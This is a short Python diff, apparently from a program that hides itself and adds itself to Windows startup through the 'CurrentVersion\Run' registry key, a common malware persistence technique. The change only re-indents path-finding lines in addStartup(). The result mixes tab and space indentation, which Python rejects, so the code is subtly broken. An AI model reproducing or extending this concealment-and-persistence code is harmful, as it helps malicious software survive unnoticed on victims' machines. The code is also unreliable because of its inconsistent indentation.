@@ -25,10 +25,10 @@ def hide():
  
 # Add to startup
 def addStartup():
-if getattr(sys, 'frozen', False):
-	fp = os.path.dirname(os.path.realpath(sys.executable))
-elif __file__:
-	fp = os.path.dirname(os.path.realpath(__file__))
+	if getattr(sys, 'frozen', False):
+		fp = os.path.dirname(os.path.realpath(sys.executable))
+	elif __file__:
+		fp = os.path.dirname(os.path.realpath(__file__))
     file_name=sys.argv[0].split("\\")[-1]
     new_file_path=fp+"\\"+file_name
     keyVal= r'Software\Microsoft\Windows\CurrentVersion\Run'
